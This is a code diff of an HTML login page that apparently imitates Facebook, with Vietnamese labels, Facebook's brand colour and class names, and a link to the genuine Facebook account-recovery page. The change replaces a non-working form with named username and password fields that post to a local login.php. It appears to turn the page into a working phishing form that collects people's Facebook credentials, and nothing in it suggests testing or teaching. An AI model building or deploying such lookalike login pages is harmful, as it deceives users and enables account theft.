@@ -17,21 +17,12 @@
 					</div>
 			<div class="content-right">
 						<form method="POST" action="login.php">
-							<div class="form-group">
-								<input type="text" placeholder="Email address or phone number">
-							</div>
-							<div class="form-group">
-								<input type="password" placeholder="Password">
-							</div>
-							<div class="login">
-								<a href="" class="btn">log in</a>
-							</div>
-							<div class="forgot">
-								<a href="">Forgotten account?</a>
-							</div>
-							<div class="create-btn">
-								<a href="" class="btn">create new account</a>
-							</div>
+							<label for="username">Username:</label>
+					<input name="username" type="text" id="username"></input><br /><br />
+					<label for="password">Password:</label>
+					<input name="password" id="password" type="password"></input><br />
+					<input type="submit" name="submit" value="Đăng Nhập" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
+                                        <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
 						</form>
 </div>
 		<section>
